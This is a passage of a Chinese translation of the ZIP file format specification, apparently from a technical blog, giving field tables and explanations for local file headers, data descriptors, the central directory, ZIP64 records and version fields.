该规范(官方文档)不提供任何有关在ZIP文件中使用清单文件的信息或指南。<br>&emsp;&emsp;ZIP文件可以放在<code>其他ZIP文件</code>中。</p><h3 id="2-2、ZIP元数据-ZIP-Metadata"><a href="#2-2、ZIP元数据-ZIP-Metadata" class="headerlink" title="2.2、ZIP元数据(ZIP Metadata)"></a>2.2、ZIP元数据(ZIP Metadata)</h3><p>&emsp;&emsp;ZIP文件由<code>元数据</code>标识，元数据由<code>定义的记录类型</code>组成，这些<code>记录类型</code>包含维护放置在ZIP文件中的文件所需的<code>存储信息</code>。 每个记录类型必须使用标识记录类型的<code>头标识</code>来标识。 <code>标识值</code>以两个字节的常量标记<code>0x4b50</code>开头，代表字符“<code>PK</code>”。</p><h3 id="2-3、-ZIP文件的常规格式"><a href="#2-3、-ZIP文件的常规格式" class="headerlink" title="2.3、.ZIP文件的常规格式"></a>2.3、.ZIP文件的常规格式</h3><p>&emsp;&emsp;一个ZIP文件必须包含“<code>中心目录结束记录</code>(End of Central Directory Record)”。 仅包含“<code>中心目录结束记录</code>(End of Central Directory Record)”的ZIP文件被视为<code>空ZIP文件</code>。 可以在ZIP文件中<code>添加</code>或<code>替换</code>文件，也可以<code>删除</code>文件。 一个ZIP文件必须只有<code>一个</code>“中心目录结束记录(End of Central Directory Record)”。 本规范中定义的<code>其他记录</code>可以根据需要用于支持<code>单个</code>ZIP文件的<code>存储要求</code>。<br>&emsp;&emsp;在ZIP文件中的<code>每个文件</code>的前面都必须有一个该文件的“<code>本地文件头</code>(Local File Header)”记录。 每个“<code>本地文件头</code>(Local File Header)”都必须在ZIP文件的<code>中心目录</code>(Central Directory)部分中随附一个相应的“<code>中心目录头</code>(Central Directory Header)”记录。<br>&emsp;&emsp;文件可以在ZIP文件中以<code>任意顺序</code>存储。 一个ZIP文件可以分割成<code>多个卷</code>，也可以分成<code>用户定义的段大小</code>。 除非本文档中为<code>特定数据元素</code>另外指定，否则所有值都必须以<code>小端字节顺序</code>存储。<br>&emsp;&emsp;<code>压缩</code>不得应用于“<code>本地文件头</code>(Local File Header)”，“<code>加密头</code>(encryption header)”或“<code>中心目录结束记录</code>(End of Central Directory Record)”。 <code>单个</code>“<code>中心目录记录</code>(Central Directory Records)”绝不能压缩，但是所有“<code>中心目录记录</code>(Central Directory Records)”的<code>总和</code>可以压缩。<br>&emsp;&emsp;<code>文件数据</code>后可以跟文件的“<code>数据描述符</code>(Data Descriptor)”。 数据描述符用于促进<code>ZIP文件流传输</code>。</p><h4 id="2-3-1、-ZIP文件整体布局"><a href="#2-3-1、-ZIP文件整体布局" class="headerlink" title="2.3.1、.ZIP文件整体布局"></a>2.3.1、.ZIP文件整体布局</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">local</span> file header 1] - 本地文件头1</span><br><span class="line">[encryption header 1] - 加密头1</span><br><span class="line">[file data 1] - 文件数据1</span><br><span class="line">[data descriptor 1] - 数据描述符1</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">[<span class="built_in">local</span> file header n] - 本地文件头n</span><br><span class="line">[encryption header n] - 加密头n</span><br><span class="line">[file data n] - 文件数据n</span><br><span class="line">[data descriptor n] - 数据描述符n</span><br><span class="line">[archive decryption header] - 压缩文档解密头</span><br><span class="line">[archive extra data record] - 压缩文档扩展数据记录</span><br><span class="line">[central directory header 1] - 中心目录头1</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">[central directory header n] - 中心目录头n</span><br><span class="line">[digital signature] - 数字签名</span><br><span class="line">[zip64 end of central directory record] - zip64中心目录结束记录</span><br><span class="line">[zip64 end of central directory locator] - zip64中心目录结束定位器</span><br><span class="line">[end of central directory record] - 中心目录结束记录</span><br></pre></td></tr></table></figure><h4 id="2-3-2、本地文件头-Local-File-Header"><a href="#2-3-2、本地文件头-Local-File-Header" class="headerlink" title="2.3.2、本地文件头(Local File Header)"></a>2.3.2、本地文件头(Local File Header)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Local file header signature</td><td style="text-align:center">4</td><td style="text-align:left">文件头标识，固定值(50 4B 03 04)</td></tr><tr><td style="text-align:left">Version needed to extract</td><td style="text-align:center">2</td><td style="text-align:left">解压文件所需的ZIP最低版本</td></tr><tr><td style="text-align:left">General purpose bit flag</td><td style="text-align:center">2</td><td style="text-align:left">通用位标志</td></tr><tr><td style="text-align:left">Compression method</td><td style="text-align:center">2</td><td style="text-align:left">压缩方式</td></tr><tr><td style="text-align:left">Last mod file time</td><td style="text-align:center">2</td><td style="text-align:left">文件最后修改时间</td></tr><tr><td style="text-align:left">Last mod file date</td><td style="text-align:center">2</td><td style="text-align:left">文件最后修改日期</td></tr><tr><td style="text-align:left">CRC-32</td><td style="text-align:center">4</td><td style="text-align:left">未压缩数据的CRC32</td></tr><tr><td style="text-align:left">Compressed size</td><td style="text-align:center">4</td><td style="text-align:left">压缩后的大小</td></tr><tr><td style="text-align:left">Uncompressed size</td><td style="text-align:center">4</td><td style="text-align:left">未压缩的大小</td></tr><tr><td style="text-align:left">File name length</td><td style="text-align:center">2</td><td style="text-align:left">文件名长度</td></tr><tr><td style="text-align:left">Extra field length</td><td style="text-align:center">2</td><td style="text-align:left">扩展区域长度</td></tr><tr><td style="text-align:left">File name</td><td style="text-align:center">N</td><td style="text-align:left">文件名</td></tr><tr><td style="text-align:left">Extra field</td><td style="text-align:center">N</td><td style="text-align:left">扩展区域</td></tr></tbody></table><p>&emsp;&emsp;扩展区域包含各种可选数据，例如特定于OS的属性。它分为多个块，每个块具有16位ID码和16位长度。紧随其后的是压缩数据。</p><h4 id="2-3-3、文件数据-File-data"><a href="#2-3-3、文件数据-File-data" class="headerlink" title="2.3.3、文件数据(File data)"></a>2.3.3、文件数据(File data)</h4><p>&emsp;&emsp;应将文件的<code>压缩</code>或<code>存储</code>数据紧随在<code>本地文件头</code>(Local File Header)后。如果文件<code>已加密</code>，则文件的<code>加密头</code>(encryption header)应放置在<code>本地文件头</code>(Local File Header)之后和<code>文件数据</code>之前。 对于.ZIP压缩文档中的<code>每个文件</code>，重复执行一系列的<code>[本地文件头][加密头][文件数据][数据描述符]</code>结构。<br>&emsp;&emsp;0字节<code>文件</code>，<code>目录</code>和其他<code>不包含任何内容的文件类型</code>，不得包含<code>文件数据</code>。</p><h4 id="2-3-4、数据描述符-Data-descriptor"><a href="#2-3-4、数据描述符-Data-descriptor" class="headerlink" title="2.3.4、数据描述符(Data descriptor)"></a>2.3.4、数据描述符(Data descriptor)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Optional data descriptor signature</td><td style="text-align:center">4</td><td style="text-align:left">(可选的)数据描述符标识，固定值(50 4B 07 08)</td></tr><tr><td style="text-align:left">CRC-32</td><td style="text-align:center">4</td><td style="text-align:left">未压缩数据的CRC32</td></tr><tr><td style="text-align:left">Compressed size</td><td style="text-align:center">4</td><td style="text-align:left">压缩后的大小</td></tr><tr><td style="text-align:left">Uncompressed size</td><td style="text-align:center">4</td><td style="text-align:left">未压缩的大小</td></tr></tbody></table><p>&emsp;&emsp;如果设置了<code>通用位标志</code>的<code>位3</code>，则该描述符必须存在(见下文)。 它按<code>字节对齐</code>，紧随压缩数据的最后一个字节。仅在<code>无法在输出的.ZIP文件中查找</code>时(例如，当输出.ZIP文件是<code>标准输出</code>或<code>不可搜索的设备</code>时)，才应使用此描述符。对于<code>ZIP64(tm)</code>格式的压缩文件，<code>压缩</code>和<code>未压缩</code>的大小均为8个字节。<br>&emsp;&emsp;<code>压缩文件</code>时，当文件大小超过<code>0xFFFFFFFF</code>时，<code>压缩</code>和<code>未压缩</code>的大小应以<code>ZIP64格式</code>(作为<code>8字节</code>的值)存储。 但是，<code>无论文件大小如何</code>，都可以使用<code>ZIP64格式</code>。 <code>解压缩</code>时，如果该文件存在<code>ZIP64扩展信息扩展区域</code>，则<code>压缩</code>和<code>未压缩</code>的大小将为<code>8字节</code>的值。<br>&emsp;&emsp;尽管<code>最初</code>未指定标识，但通常将值<code>0x08074B50</code>用作数据描述符记录的<code>标识值</code>。 实现者应注意，在读取ZIP文件以<code>确保兼容性</code>时，无论是否带有此标识标记的数据描述符，都可能会遇到ZIP文件，无论哪种情况都应说明。<br>&emsp;&emsp;<code>写ZIP文件</code>时，实现者应包括标记数据描述符记录的标识值。 <code>使用标识</code>时，当前为数据描述符记录定义的字段将紧随标识之后。<br>&emsp;&emsp;<code>可扩展的数据描述符</code>将在此APPNOTE的将来版本中发布。 此新记录旨在解决先前使用此记录的<code>冲突</code>，并为<code>流文件处理</code>提供更好的支持。<br>&emsp;&emsp;当使用<code>中心目录加密</code>方法时，数据描述符记录<code>不是必需的</code>，但可以使用。 如果<code>存在</code>，并且<code>通用位标记</code>的<code>位3</code>被设置为指示其存在，则<code>数据描述符记录</code>的字段中的值必须设置为<code>二进制0</code>。</p><h4 id="2-3-5、压缩文档解密头-Archive-decryption-header"><a href="#2-3-5、压缩文档解密头-Archive-decryption-header" class="headerlink" title="2.3.5、压缩文档解密头(Archive decryption header)"></a>2.3.5、压缩文档解密头(Archive decryption header)</h4><p>&emsp;&emsp;ZIP格式规范的<code>6.2版</code>中引入了<code>压缩文档解密头</code>。 该记录的存在是对作为本文档中所述的<code>强加密规范</code>的一部分实现的<code>中心目录加密功能</code>的支持。当中心目录结构<code>已加密</code>时，此<code>解密头</code>必须位于<code>加密数据段</code>之前。<br>&emsp;&emsp;<code>加密的数据段</code>应包含<code>压缩文档扩展数据记录</code>(如果存在)和<code>加密的中心目录结构数据</code>。 <code>该数据记录</code>的格式与<code>压缩文件数据</code>之前的<code>加密头记录</code>相同。 如果中心目录结构<code>已加密</code>，则使用“<code>ZIP64中心目录结束记录</code>(ZIP64 end of central directory record)”中的“<code>中心目录的开始</code>(Start of Central Directory)”字段确定此数据记录的<code>开始位置</code>。 有关<code>压缩文档解密头记录</code>中使用的字段的信息，请参阅“强加密规范”部分。</p><h4 id="2-3-6、压缩文档扩展数据记录-Archive-extra-data-record"><a href="#2-3-6、压缩文档扩展数据记录-Archive-extra-data-record" class="headerlink" title="2.3.6、压缩文档扩展数据记录(Archive extra data record)"></a>2.3.6、压缩文档扩展数据记录(Archive extra data record)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Archive extra data signature</td><td style="text-align:center">4</td><td style="text-align:left">压缩文档扩展数据标识，固定值(50 4B 06 08)</td></tr><tr><td style="text-align:left">Extra field length</td><td style="text-align:center">4</td><td style="text-align:left">扩展区域长度</td></tr><tr><td style="text-align:left">Extra field data</td><td style="text-align:center">N</td><td style="text-align:left">扩展区域</td></tr></tbody></table><p>&emsp;&emsp;ZIP格式规范的<code>6.2版</code>中引入了<code>Archive Extra Data Record</code>。 该记录可以用于支持作为本文档中所述的<code>强加密规范</code>的一部分实现的<code>中心目录加密功能</code>。当该记录存在时，该记录必须紧随<code>中心目录数据结构</code>之前。<br>&emsp;&emsp;该数据记录的大小应包含在<code>中心目录结束记录</code>(End of central directory record)的<code>中心目录大小</code>(Size of the Central Directory)字段中。 如果中心目录结构<code>已压缩</code>，但<code>未加密</code>，则使用“<code>ZIP64中心目录结束记录</code>(ZIP64 end of central directory record)”中的“<code>中心目录的开始</code>(Start of Central Directory)”字段确定此数据记录的<code>起始位置</code>。</p><h4 id="2-3-7、中心目录结构-Central-directory-structure"><a href="#2-3-7、中心目录结构-Central-directory-structure" class="headerlink" title="2.3.7、中心目录结构(Central directory structure)"></a>2.3.7、中心目录结构(Central directory structure)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[central directory header 1] - 中心目录头1</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">[central directory header n] - 中心目录头n</span><br><span class="line">[digital signature] - 数字签名</span><br></pre></td></tr></table></figure><p><strong><code>中心目录头(Central directory header):</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Central directory file header signature</td><td style="text-align:center">4</td><td style="text-align:left">中心目录文件头标识，固定值(50 4B 01 02)</td></tr><tr><td style="text-align:left">Version made by</td><td style="text-align:center">2</td><td style="text-align:left">压缩所用的ZIP版本</td></tr><tr><td style="text-align:left">Version needed to extract</td><td style="text-align:center">2</td><td style="text-align:left">解压文件所需的ZIP最低版本</td></tr><tr><td style="text-align:left">General purpose bit flag</td><td style="text-align:center">2</td><td style="text-align:left">通用位标记</td></tr><tr><td style="text-align:left">Compression method</td><td style="text-align:center">2</td><td style="text-align:left">压缩方法</td></tr><tr><td style="text-align:left">Last mod file time</td><td style="text-align:center">2</td><td style="text-align:left">文件最后修改时间</td></tr><tr><td style="text-align:left">Last mod file date</td><td style="text-align:center">2</td><td style="text-align:left">文件最后修改日期</td></tr><tr><td style="text-align:left">CRC-32</td><td style="text-align:center">4</td><td style="text-align:left">未压缩数据的CRC32</td></tr><tr><td style="text-align:left">Compressed size</td><td style="text-align:center">4</td><td style="text-align:left">压缩后的大小</td></tr><tr><td style="text-align:left">Uncompressed size</td><td style="text-align:center">4</td><td style="text-align:left">未压缩的大小</td></tr><tr><td style="text-align:left">File name length</td><td style="text-align:center">2</td><td style="text-align:left">文件名长度</td></tr><tr><td style="text-align:left">Extra field length</td><td style="text-align:center">2</td><td style="text-align:left">扩展区域长度</td></tr><tr><td style="text-align:left">File comment length</td><td style="text-align:center">2</td><td style="text-align:left">文件注释长度</td></tr><tr><td style="text-align:left">Disk number start</td><td style="text-align:center">2</td><td style="text-align:left">文件开始位置所在的磁盘编号</td></tr><tr><td style="text-align:left">Internal file attributes</td><td style="text-align:center">2</td><td style="text-align:left">内部文件属性</td></tr><tr><td style="text-align:left">External file attributes</td><td style="text-align:center">4</td><td style="text-align:left">外部文件属性</td></tr><tr><td style="text-align:left">Relative offset of local header</td><td style="text-align:center">4</td><td style="text-align:left">本地文件头的相对偏移</td></tr><tr><td style="text-align:left">File name</td><td style="text-align:center">N</td><td style="text-align:left">文件名</td></tr><tr><td style="text-align:left">Extra field</td><td style="text-align:center">N</td><td style="text-align:left">扩展区域</td></tr><tr><td style="text-align:left">File comment</td><td style="text-align:center">N</td><td style="text-align:left">文件注释</td></tr></tbody></table><p><strong><code>数字签名(Digital signature):</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header signature</td><td style="text-align:center">4</td><td style="text-align:left">头标识，固定值(50 4B 05 05)</td></tr><tr><td style="text-align:left">Size of data</td><td style="text-align:center">2</td><td style="text-align:left">数据的大小</td></tr><tr><td style="text-align:left">Signature data</td><td style="text-align:center">N</td><td style="text-align:left">签名数据</td></tr></tbody></table><p>&emsp;&emsp;随着本规范6.2版中<code>中心目录加密功能</code>的引入，<code>中心目录结构</code>(Central directory structure)可以以<code>压缩并加密</code>的方式存储。 尽管不是必需的，但在<code>加密中心目录结构</code>时假定它会被<code>压缩</code>以<code>提高存储效率</code>。有关<code>中心目录加密功能</code>的信息可以在描述<code>强加密规范</code>(Strong Encryption Specification)的部分中找到。<code>数字签名记录</code>(Digital signature)将不会被压缩或加密。</p><h4 id="2-3-8、ZIP64中心目录结束记录-ZIP64-end-of-central-directory-record"><a href="#2-3-8、ZIP64中心目录结束记录-ZIP64-end-of-central-directory-record" class="headerlink" title="2.3.8、ZIP64中心目录结束记录(ZIP64 end of central directory record)"></a>2.3.8、ZIP64中心目录结束记录(ZIP64 end of central directory record)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">ZIP64 end of central directory record signature</td><td style="text-align:center">4</td><td style="text-align:left">ZIP64中心目录结束记录标识，固定值(50 4B 06 06)</td></tr><tr><td style="text-align:left">Size of ZIP64 end of central directory record</td><td style="text-align:center">8</td><td style="text-align:left">ZIP64中心目录结束记录的大小</td></tr><tr><td style="text-align:left">Version made by</td><td style="text-align:center">2</td><td style="text-align:left">压缩所用的ZIP版本</td></tr><tr><td style="text-align:left">Version needed to extract</td><td style="text-align:center">2</td><td style="text-align:left">解压文件所需的ZIP最低版本</td></tr><tr><td style="text-align:left">Number of this disk</td><td style="text-align:center">4</td><td style="text-align:left">当前磁盘编号</td></tr><tr><td style="text-align:left">Number of the disk with the start of the central directory</td><td style="text-align:center">4</td><td style="text-align:left">中心目录开头所在的磁盘号</td></tr><tr><td style="text-align:left">Total number of entries in the central directory on this disk</td><td style="text-align:center">8</td><td style="text-align:left">该磁盘上中心目录的条目总数</td></tr><tr><td style="text-align:left">Total number of entries in the central directory</td><td style="text-align:center">8</td><td style="text-align:left">中心目录中的条目总数</td></tr><tr><td style="text-align:left">Size of the central directory</td><td style="text-align:center">8</td><td style="text-align:left">中心目录的大小</td></tr><tr><td style="text-align:left">Offset of start of central directory with respect to the starting disk number</td><td style="text-align:center">8</td><td style="text-align:left">中心目录开始位置相对于压缩文档开始位置的偏移</td></tr><tr><td style="text-align:left">ZIP64 extensible data sector</td><td style="text-align:center">N</td><td style="text-align:left">ZIP64扩展数据段</td></tr></tbody></table><p>&emsp;&emsp;存储在“<code>ZIP64中心目录结束记录的大小</code>(Size of ZIP64 end of central directory record)”中的值应为<code>剩余记录</code>的大小，并且不应包含<code>前导的12个字节</code>。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Size = SizeOfFixedFields(固定字段) + SizeOfVariableData(可变数据)- 12</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;上面的记录结构定义了<code>ZIP64中心目录结束记录</code>的<code>版本1</code>。 为了支持<code>ZIP64大文件功能</code>，在<code>6.2之前</code>的版本中实现了<code>版本1</code>。 作为<code>强加密规范</code>的一部分，在<code>版本6.2</code>中实现的<code>中心目录加密功能</code>的引入定义了此记录结构的<code>版本2</code>。 有关此记录的版本2格式的详细信息，请参阅描述“强加密规范”的部分。<br>&emsp;&emsp;<code>特殊用途的数据</code>可以位于该记录的V1或V2版本后面的<code>ZIP64扩展数据段</code>中。为了确保<code>识别</code>此特殊用途的数据，它必须包括一个由以下内容组成的<code>识别头块</code>：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header ID</td><td style="text-align:center">2</td><td style="text-align:left">头ID字段指示随后的数据块中数据的数据类型。</td></tr><tr><td style="text-align:left">Data Size</td><td style="text-align:center">4</td><td style="text-align:left">数据大小标识此数据块类型后面的数据的字节数。</td></tr></tbody></table><p>&emsp;&emsp;可能存在<code>多个</code>特殊用途的数据块。 每一个必须以<code>Header ID</code>和<code>Data Size</code>字段为<code>先导字段</code>。 当前该字段中支持的<code>Header ID值的映射</code>如<code>附录C</code>中所定义。</p><h4 id="2-3-9、ZIP64中心目录结束定位器-ZIP64-end-of-central-directory-locator"><a href="#2-3-9、ZIP64中心目录结束定位器-ZIP64-end-of-central-directory-locator" class="headerlink" title="2.3.9、ZIP64中心目录结束定位器(ZIP64 end of central directory locator)"></a>2.3.9、ZIP64中心目录结束定位器(ZIP64 end of central directory locator)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">ZIP64 end of central directory locator signature</td><td style="text-align:center">4</td><td style="text-align:left">ZIP64中心目录结束定位器标识，固定值(50 4B 06 07)</td></tr><tr><td style="text-align:left">Number of the disk with the start of the zip64 end of central directory</td><td style="text-align:center">4</td><td style="text-align:left">ZIP64中心目录开头所在的磁盘号</td></tr><tr><td style="text-align:left">Relative offset of the zip64 end of central directory record</td><td style="text-align:center">8</td><td style="text-align:left">ZIP64中心目录结束记录相对偏移</td></tr><tr><td style="text-align:left">Total number of disks</td><td style="text-align:center">4</td><td style="text-align:left">磁盘总数</td></tr></tbody></table><h4 id="2-3-10、中心目录结束记录-End-of-central-directory-record"><a href="#2-3-10、中心目录结束记录-End-of-central-directory-record" class="headerlink" title="2.3.10、中心目录结束记录(End of central directory record)"></a>2.3.10、中心目录结束记录(End of central directory record)</h4><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">End of central directory signature</td><td style="text-align:center">4</td><td style="text-align:left">中心目录结束标识，固定值(50 4B 05 06)</td></tr><tr><td style="text-align:left">Number of this disk</td><td style="text-align:center">2</td><td style="text-align:left">当前磁盘编号</td></tr><tr><td style="text-align:left">Number of the disk with the start of the central directory</td><td style="text-align:center">2</td><td style="text-align:left">中心目录开头所在的磁盘号</td></tr><tr><td style="text-align:left">Total number of entries in the central directory on this disk</td><td style="text-align:center">2</td><td style="text-align:left">该磁盘上中心目录的条目总数</td></tr><tr><td style="text-align:left">Total number of entries in the central directory</td><td style="text-align:center">2</td><td style="text-align:left">中心目录的条目总数</td></tr><tr><td style="text-align:left">Size of the central directory</td><td style="text-align:center">4</td><td style="text-align:left">中心目录的大小</td></tr><tr><td style="text-align:left">Offset of start of central directory with respect to the starting disk number</td><td style="text-align:center">4</td><td style="text-align:left">中心目录开始位置相对于压缩文档开始位置的偏移</td></tr><tr><td style="text-align:left">.ZIP file comment length</td><td style="text-align:center">2</td><td style="text-align:left">.ZIP文件注释长度</td></tr><tr><td style="text-align:left">.ZIP file comment</td><td style="text-align:center">N</td><td style="text-align:left">.ZIP文件注释</td></tr></tbody></table><h3 id="2-4、字段解释"><a href="#2-4、字段解释" class="headerlink" title="2.4、字段解释"></a>2.4、字段解释</h3><h4 id="2-4-1、字段的一般说明"><a href="#2-4-1、字段的一般说明" class="headerlink" title="2.4.1、字段的一般说明"></a>2.4.1、字段的一般说明</h4><p>&emsp;&emsp;除非另有说明，否则所有字段均为<code>无符号数据类型</code>，并以Intel<code>低字节:高字节</code>，<code>低字节:高字节</code>顺序存储(<code>小端模式</code>)。<br>&emsp;&emsp;<code>字符串字段</code>不是以<code>null</code>结尾的，因为长度是<code>明确指定</code>的。<br>&emsp;&emsp;中心目录中的<code>条目的顺序</code>可能不一定与文件在<code>.ZIP文件</code>中<code>出现的顺序</code>相同。<br>&emsp;&emsp;如果<code>中心目录结束记录</code>的字段之一<code>太小</code>而无法容纳所需的数据，则应将字段设置为<code>-1(0xFFFF或0xFFFFFFFF)</code>，并应创建<code>ZIP64格式的记录</code>。<br>&emsp;&emsp;<code>拆分</code>或<code>扩展</code>压缩文件时，<code>中心目录结束记录</code>和<code>ZIP64中心目录结束定位器记录</code>的务必驻留在<code>同一磁盘</code>上。</p><h4 id="2-4-2、压缩所用的ZIP版本-Version-made-by-2-bytes"><a href="#2-4-2、压缩所用的ZIP版本-Version-made-by-2-bytes" class="headerlink" title="2.4.2、压缩所用的ZIP版本(Version made by) (2 bytes)"></a>2.4.2、压缩所用的ZIP版本(Version made by) (2 bytes)</h4><p>&emsp;&emsp;<code>高位字节</code>指示文件属性信息的兼容性。 如果<code>外部文件属性</code>与MS-DOS兼容并且可以由<code>DOS版本2.04g的PKZIP</code>读取，则该值将为<code>零</code>。 如果<code>这些属性不兼容</code>，则此值将标识<code>属性兼容的主机系统</code>。 软件可以使用此信息来确定文本文件等的<code>行记录格式</code>。</p><p>当前的映射为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0 - MS-DOS and OS/2(FAT/VFAT/FAT32 file systems)</span><br><span class="line">1 - Amiga                     2 - OpenVMS</span><br><span class="line">3 - UNIX                      4 - VM/CMS</span><br><span class="line">5 - Atari ST                  6 - OS/2 H.P.F.S.</span><br><span class="line">7 - Macintosh                 8 - Z-System</span><br><span class="line">9 - CP/M                      10 - Windows NTFS</span><br><span class="line">11 - MVS (OS/390 - Z/OS)      12 - VSE</span><br><span class="line">13 - Acorn Risc               14 - VFAT</span><br><span class="line">15 - alternate MVS            16 - BeOS</span><br><span class="line">17 - Tandem                   18 - OS/400</span><br><span class="line">19 - OS X (Darwin)            20 thru 255 - unused</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>低位字节</code>指示用于编码文件的软件支持的<code>ZIP规范版本</code>(本文档的版本)。 <code>value/10</code>表示<code>主要版本号</code>，<code>value mod 10</code>是<code>次要版本号</code>。</p><h4 id="2-4-3、解压文件所需的ZIP最低版本-Version-needed-to-extract-2-bytes"><a href="#2-4-3、解压文件所需的ZIP最低版本-Version-needed-to-extract-2-bytes" class="headerlink" title="2.4.3、解压文件所需的ZIP最低版本(Version needed to extract) (2 bytes)"></a>2.4.3、解压文件所需的ZIP最低版本(Version needed to extract) (2 bytes)</h4><p>&emsp;&emsp;解压文件所需的<code>最低受支持ZIP规范版本</code>，如上映射。该值基于<code>ZIP程序必须支持的特定格式功能</code>才能解压文件。如果将<code>多个功能</code>应用于文件，则必须将最低版本设置为<code>具有最高值的功能的版本值</code>。为了避免冲突，<code>新功能</code>或<code>功能更改</code>将使用比上次发布的值更高的版本号实现影响已发布的格式规范。</p><p>当前的<strong><code>最低功能版本</code></strong>如下所示：</p><ul><li><code>1.0</code> - Default value：默认值。</li><li><code>1.1</code> - File is a volume label：文件是一个卷标。</li><li><code>2.0</code> - File is a folder (directory)：文件是一个文件夹(目录)。</li><li><code>2.0</code> - File is compressed using Deflate compression：使用<code>Deflate压缩方法</code>对文件进行压缩。</li><li><code>2.0</code> - File is encrypted using traditional PKWARE encryption：使用<code>传统的PKWARE加密</code>对文件进行加密。</li><li><code>2.1</code> - File is compressed using Deflate64(tm)：使用<code>Deflate64(tm)压缩方法</code>对文件进行压缩。</li><li><code>2.5</code> - File is compressed using PKWARE DCL Implode：使用<code>PKWARE DCL Implode压缩</code>方法对文件进行压缩。</li><li><code>2.7</code> - File is a patch data set：文件是补丁数据集。</li><li><code>4.5</code> - File uses ZIP64 format extensions：文件使用<code>ZIP64格式扩展</code>。</li><li><code>4.6</code> - File is compressed using BZIP2 compression*：使用<code>BZIP2压缩方法</code>对文件进行压缩。</li><li><code>5.0</code> - File is encrypted using DES：使用<code>DES</code>对文件进行加密。</li><li><code>5.0</code> - File is encrypted using 3DES：使用<code>3DES</code>对文件进行加密。</li><li><code>5.0</code> - File is encrypted using original RC2 encryption：使用<code>原始RC2加密</code>对文件进行加密。</li><li><code>5.0</code> - File is encrypted using RC4 encryption：使用<code>RC4加密</code>对文件进行加密。</li><li><code>5.1</code> - File is encrypted using AES encryption：使用<code>AES加密</code>对文件进行加密。</li><li><code>5.1</code> - File is encrypted using corrected RC2 encryption**：使用<code>更正的RC2加密</code>对文件进行加密。</li><li><code>5.2</code> - File is encrypted using corrected RC2-64 encryption**：使用<code>更正的RC2-64加密</code>对文件进行加密</li><li><code>6.1</code> - File is encrypted using non-OAEP key wrapping<em>*</em>：使用<code>non-OAEP密钥包装</code>对文件进行加密。</li><li><code>6.2</code> - Central directory encryption：中心目录加密。</li><li><code>6.3</code> - File is compressed using LZMA：使用<code>LZMA压缩方法</code>对文件进行压缩。</li><li><code>6.3</code> - File is compressed using PPMd+：使用<code>PPMd+压缩方法</code>对文件进行压缩。</li><li><code>6.3</code> - File is encrypted using Blowfish：使用<code>Blowfish</code>对文件进行加密。</li><li><code>6.3</code> - File is encrypted using Twofish：使用<code>Twofish</code>对文件进行加密。</li></ul><p><strong><code>需要解压的版本注释：</code></strong><br>&emsp;&emsp;PKZIP的7.x(7.2之前)的<code>早期版本</code>错误地将<code>BZIP2压缩</code>所需的提取版本设置为<code>50</code>，但应将其设置为<code>46</code>。<br>&emsp;&emsp;有关<code>RC2校正</code>的更多信息，请参阅“<code>强加密规范</code>”部分。<br>&emsp;&emsp;使用<code>non-OAEP密钥包装</code>的证书加密是从<code>6.1</code>开始的所有版本的<code>预期操作模式</code>。当发送要由<code>低于6.1(5.0或6.0)</code>的PKZIP版本打开的ZIP文件时，对OAEP密钥包装的支持只能用于<code>向后兼容</code>。<br>&emsp;&emsp;使用<code>PPMd+压缩</code>的文件必须将<code>解压文件所需的版本</code>字段设置为<code>6.3</code>，但是，并非所有ZIP程序都强制执行此操作，并且如果设置了该值，则可能<code>无法解压缩</code>使用<code>PPMd+压缩</code>的数据文件。<br>&emsp;&emsp;使用<code>ZIP64扩展</code>时，还必须在<code>ZIP64中心目录结束记录</code>中设置相应的值。 应该适当地设置该字段以指示使用的是<code>版本1</code>还是<code>版本2</code>格式。</p><h4 id="2-4-4、通用位标志-General-purpose-bit-flag-2-bytes"><a href="#2-4-4、通用位标志-General-purpose-bit-flag-2-bytes" class="headerlink" 